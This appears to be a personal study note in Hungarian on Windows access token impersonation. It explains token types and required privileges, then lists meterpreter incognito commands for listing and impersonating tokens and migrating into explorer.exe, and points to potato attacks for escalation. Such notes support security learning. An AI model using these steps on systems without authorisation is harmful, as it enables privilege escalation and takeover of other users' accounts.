# access_token_impersonation
## info
* access tokens
  * windows auth reszei
  * lsass menedzseli oket
  * process vagy thread futtatasanal ez az ami kvazi authorizalja a usert akinek a kontextusaban futtatni akarjuk
  * kb mint a cookie a web eseten
  * winlogon.exe hozza letre authentikacio utan
  * tobbfele security level alapjan kategorizalhatok
    * impersonate-level token
      * non-interactive logon eredmenye
      * csak local system-en hasznalhato
    * delegate-level token
      * interactive logon eredmenye
      * winlogon.exe vagy rdp bejelentkezes eredmenyekepp jon letre
      * akarmilyen rendszeren hasznalhato (local system, external system)
* impersonation attackhez szukseges privilege-ek
  * SeAssignPrimaryToken        allows user to impersonate tokens
  * SeCreateToken               allows user to create arbitrary token with admin privileges
  * SeImpersonatePrivilege      allows user to create a process under the sec context of another user (preferebly with admin privileges)
* incognito meterpreter module
  * kilistazza az elerheto tokeneket, amiket impersonate-elhetunk
* attack1
 * van egy aktiv meterpreter session-unk
 * SeImpersonatePrivilege hozzank van rendelve
 * inkognito modul betoltese
   * meterpreter> load incognito
   * meterpreter> list_tokens -u
   * meterpreter> impoersonate_token "<token_name>"
   * migrate to x64
     * meterpreter> pgrep explorer //kiirja az explorer.exe pid-jet
     * meterpreter> migrate <pid>
   * ha list_tokens-nel nem latok kilistazva elevated token-eket
     * akkor potate attack-ekre lesz majd szukseg
       * azok generalnak egy uj tokent ami elevated es akkor azt utana impersonate-elni tudjuk
